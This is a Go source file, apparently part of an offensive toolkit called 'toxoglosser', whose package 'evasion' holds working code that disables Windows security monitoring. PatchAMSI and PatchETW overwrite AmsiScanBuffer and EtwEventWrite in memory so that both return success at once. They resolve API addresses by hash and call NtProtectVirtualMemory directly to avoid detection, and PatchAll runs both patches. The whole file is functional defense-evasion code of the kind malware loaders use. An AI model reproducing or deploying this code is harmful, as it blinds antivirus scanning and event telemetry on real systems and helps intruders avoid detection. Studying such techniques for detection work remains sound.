package evasion

import (
	"fmt"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
	"toxoglosser/common"
)

// PatchAMSI bypasses AMSI by patching the AmsiScanBuffer function in memory.
// This function uses manual API resolution and direct syscalls to patch
// the AmsiScanBuffer function to return S_OK immediately, effectively disabling AMSI.
func PatchAMSI() error {
	// Get the address of AmsiScanBuffer using manual resolution instead of LazyDLL
	amsiDll, err := common.GetModuleHandleByHash("amsi.dll")
	if err != nil {
		return fmt.Errorf("failed to get amsi.dll module handle: %w", err) // Return error for better debugging
	}

	amsiScanBufferAddr, err := common.GetProcAddressByHash(windows.Handle(amsiDll), "AmsiScanBuffer")
	if err != nil {
		return fmt.Errorf("failed to get AmsiScanBuffer address: %w", err) // Return error for better debugging
	}

	// Create a patch that returns S_OK immediately (0)
	// x64 assembly: xor eax, eax; ret
	patch := []byte{0x33, 0xC0, 0xC3}

	// Change memory protection to read-write-execute using direct syscalls
	oldProtect := uint32(0)
	regionSize := uintptr(len(patch))

	err = NtProtectVirtualMemory(windows.CurrentProcess(), &amsiScanBufferAddr, &regionSize, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return fmt.Errorf("failed to change memory protection for AmsiScanBuffer: %w", err)
	}

	// Write the patch
	copyMemory(unsafe.Pointer(amsiScanBufferAddr), unsafe.Pointer(&patch[0]), len(patch))

	// Restore original memory protection
	err = NtProtectVirtualMemory(windows.CurrentProcess(), &amsiScanBufferAddr, &regionSize, oldProtect, &oldProtect)
	if err != nil {
		return fmt.Errorf("failed to restore memory protection for AmsiScanBuffer: %w", err)
	}

	return nil
}

// PatchETW bypasses ETW by patching the EtwEventWrite function in memory.
// This function uses manual API resolution and direct syscalls to patch
// the EtwEventWrite function to return STATUS_SUCCESS immediately, effectively disabling ETW.
func PatchETW() error {
	// Get the address of EtwEventWrite from ntdll using manual resolution
	ntdllModule, err := common.GetModuleHandleByHash("ntdll.dll")
	if err != nil {
		return fmt.Errorf("failed to get ntdll.dll module handle: %w", err)
	}

	etwEventWriteAddr, err := common.GetProcAddressByHash(windows.Handle(ntdllModule), "EtwEventWrite")
	if err != nil {
		return fmt.Errorf("failed to get EtwEventWrite address: %w", err) // Return error for better debugging
	}

	// Create a patch that returns STATUS_SUCCESS immediately (0)
	// x64 assembly: xor eax, eax; ret
	patch := []byte{0x33, 0xC0, 0xC3}

	// Change memory protection to read-write-execute using direct syscalls
	oldProtect := uint32(0)
	regionSize := uintptr(len(patch))

	err = NtProtectVirtualMemory(windows.CurrentProcess(), &etwEventWriteAddr, &regionSize, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		return fmt.Errorf("failed to change memory protection for EtwEventWrite: %w", err)
	}

	// Write the patch
	copyMemory(unsafe.Pointer(etwEventWriteAddr), unsafe.Pointer(&patch[0]), len(patch))

	// Restore original memory protection
	err = NtProtectVirtualMemory(windows.CurrentProcess(), &etwEventWriteAddr, &regionSize, oldProtect, &oldProtect)
	if err != nil {
		return fmt.Errorf("failed to restore memory protection for EtwEventWrite: %w", err)
	}

	return nil
}

// NtProtectVirtualMemory is a wrapper for the NtProtectVirtualMemory syscall
func NtProtectVirtualMemory(hProcess windows.Handle, baseAddress *uintptr, regionSize *uintptr, newProtect uint32, oldProtect *uint32) error {
	// Get ntdll module and NtProtectVirtualMemory function address manually
	ntdllModule, err := common.GetModuleHandleByHash("ntdll.dll")
	if err != nil {
		return fmt.Errorf("failed to get ntdll.dll module handle: %w", err)
	}

	ntProtectVirtualMemoryAddr, err := common.GetProcAddressByHash(windows.Handle(ntdllModule), "NtProtectVirtualMemory")
	if err != nil {
		return fmt.Errorf("failed to get NtProtectVirtualMemory address: %w", err)
	}

	// Call the function directly using syscall
	ret, _, _ := syscall.SyscallN(
		ntProtectVirtualMemoryAddr,
		uintptr(hProcess),
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(oldProtect)),
	)

	if ret != 0 {
		return fmt.Errorf("NtProtectVirtualMemory failed with status: 0x%x", ret)
	}

	return nil
}

// copyMemory copies memory from source to destination
func copyMemory(dst, src unsafe.Pointer, length int) {
	for i := 0; i < length; i++ {
		*(*byte)(unsafe.Pointer(uintptr(dst) + uintptr(i))) = *(*byte)(unsafe.Pointer(uintptr(src) + uintptr(i)))
	}
}

// PatchAll attempts to bypass both AMSI and ETW in-memory protections.
// This function tries to patch both AMSI and ETW, collecting errors
// but continuing execution if one fails. Returns an error only if both
// bypass attempts fail completely.
func PatchAll() error {
	// Patch AMSI first - collect errors but don't fail completely if one fails
	amsiErr := PatchAMSI()
	if amsiErr != nil {
		// Log the error but continue with ETW patching
		// fmt.Printf("Warning: AMSI patching failed: %v\n", amsiErr) // In production, use proper logging
	}

	// Patch ETW
	etwErr := PatchETW()
	if etwErr != nil {
		// Log the error but continue
		// fmt.Printf("Warning: ETW patching failed: %v\n", etwErr) // In production, use proper logging
	}

	// Return error if BOTH failed, or return specific error if only one failed
	if amsiErr != nil && etwErr != nil {
		return fmt.Errorf("both AMSI and ETW patching failed: amsi_err=%v, etw_err=%v", amsiErr, etwErr)
	}
	if amsiErr != nil {
		return fmt.Errorf("AMSI patching failed: %w", amsiErr)
	}
	if etwErr != nil {
		return fmt.Errorf("ETW patching failed: %w", etwErr)
	}

	return nil
}